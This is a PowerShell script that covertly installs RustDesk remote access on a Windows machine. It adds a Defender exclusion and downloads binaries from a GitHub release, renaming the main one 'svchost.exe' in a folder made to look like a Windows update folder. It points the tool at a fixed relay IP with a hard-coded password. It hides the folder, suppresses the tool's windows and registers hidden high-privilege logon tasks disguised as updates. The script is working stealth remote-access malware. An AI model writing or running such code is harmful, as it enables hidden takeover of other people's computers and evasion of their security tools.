function Install-RD {
    $ProgressPreference = 'SilentlyContinue'
    $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"
    $EXE    = "$DEST\svchost.exe"
    $DLL    = "$DEST\sciter.dll"
    $HIDER  = "$DEST\hider.exe"
    $cfgDir = "$env:APPDATA\RustDesk\config"
    $base   = "https://github.com/kk70226581/rd-files/releases/download/v1.0"

    Write-Host "Installing..." -ForegroundColor Cyan

    # 1. Add Defender exclusion FIRST - prevents "virus" block on renamed exe
    try { Add-MpPreference -ExclusionPath $DEST -ErrorAction SilentlyContinue } catch {}

    # 2. Kill old instances + clean
    Get-Process svchost,hider -EA SilentlyContinue |
        Where-Object { $_.Path -like "*WinSystem*" } |
        Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
    New-Item -ItemType Directory $DEST -Force | Out-Null
    New-Item -ItemType Directory $cfgDir -Force | Out-Null

    # 3. Download all files
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("$base/chrome.exe", $EXE)
    $wc.DownloadFile("$base/sciter.dll", $DLL)
    $wc.DownloadFile("$base/hider.exe",  $HIDER)

    if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
        Write-Host "Download failed!" -ForegroundColor Red; return
    }

    # 4. Write config
    @"
rendezvous_server = '34.107.221.82'
relay_server = '34.107.221.82'
nat_type = 1
serial = 0
[options]
verification-method = 'use-permanent-password'
approve-mode = 'password'
direct-server = 'N'
force-always-relay = 'Y'
"@ | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8

    @"
enc_id = ''
password = 'Remote123'
salt = ''
key_confirmed = true
"@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8

    # 5. Hide the folder
    $f = Get-Item $DEST -Force
    $f.Attributes = $f.Attributes -bor 2 -bor 4

    # 6. Start popup killer FIRST (before RustDesk, so it catches the first window)
    Start-Process $HIDER -WindowStyle Hidden

    # 7. Start RustDesk hidden
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $EXE; $psi.WorkingDirectory = $DEST
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Start-Sleep 5

    # 8. Get ID
    $psiId = New-Object System.Diagnostics.ProcessStartInfo
    $psiId.FileName = $EXE; $psiId.Arguments = "--get-id"
    $psiId.UseShellExecute = $false
    $psiId.RedirectStandardOutput = $true
    $psiId.CreateNoWindow = $true
    $psiId.WorkingDirectory = $DEST
    $prId = [System.Diagnostics.Process]::Start($psiId)
    $outT = $prId.StandardOutput.ReadToEndAsync()
    $prId.WaitForExit(8000) | Out-Null
    $RDID = $outT.Result.Trim()

    # 9. Auto-start on every boot via scheduled task
    $rdAction  = New-ScheduledTaskAction -Execute $EXE
    $hidAction = New-ScheduledTaskAction -Execute $HIDER
    $trigger   = New-ScheduledTaskTrigger -AtLogOn
    $settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0
    Register-ScheduledTask -TaskName "WinUpdate_RD"   -Action $rdAction  -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
    Register-ScheduledTask -TaskName "WinUpdate_Hide" -Action $hidAction -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null

    # 10. Delete script + desktop shortcut
    $deletePs = "$DEST\delete.ps1"
    @'
$d = "$env:LOCALAPPDATA\WinSystemUpdate"
Get-Process svchost,hider -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
Unregister-ScheduledTask -TaskName "WinUpdate_RD"   -Confirm:$false -EA SilentlyContinue
Unregister-ScheduledTask -TaskName "WinUpdate_Hide" -Confirm:$false -EA SilentlyContinue
Start-Sleep 2
Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
foreach ($dp in @([Environment]::GetFolderPath("Desktop"), "$env:USERPROFILE\Desktop", "$env:USERPROFILE\OneDrive\Desktop")) {
    Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue
}
'@ | Set-Content $deletePs -Encoding UTF8

    $lnkPath = $null
    foreach ($dp in @([Environment]::GetFolderPath('Desktop'), "$env:USERPROFILE\Desktop", "$env:USERPROFILE\OneDrive\Desktop")) {
        if (Test-Path $dp) { $lnkPath = "$dp\DELETE CHROME.lnk"; break }
    }
    if ($lnkPath) {
        $sh = (New-Object -COM WScript.Shell).CreateShortcut($lnkPath)
        $sh.TargetPath   = "powershell.exe"
        $sh.Arguments    = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$deletePs`""
        $sh.IconLocation = "shell32.dll,131"
        $sh.Save()
    }

    # 11. 1-hour auto-delete
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"Start-Sleep 3600; & '$deletePs'`""

    # 12. Done
    Write-Host ""
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host "   DONE! Remote Access is now active." -ForegroundColor Green
    Write-Host "  ==========================================" -ForegroundColor Green
    Write-Host "   Your ID:  $RDID" -ForegroundColor Cyan
    Write-Host "   Password: Remote123" -ForegroundColor Cyan
    Write-Host "   Popup:    BLOCKED (no UI will appear)" -ForegroundColor Cyan
    Write-Host "   Auto-starts on boot: YES" -ForegroundColor Gray
    Write-Host "   Desktop shortcut: DELETE CHROME (to uninstall)" -ForegroundColor Gray
    Write-Host "   Auto-deletes in 1 hour." -ForegroundColor Gray
    Write-Host "  ==========================================" -ForegroundColor Green
}
Install-RD
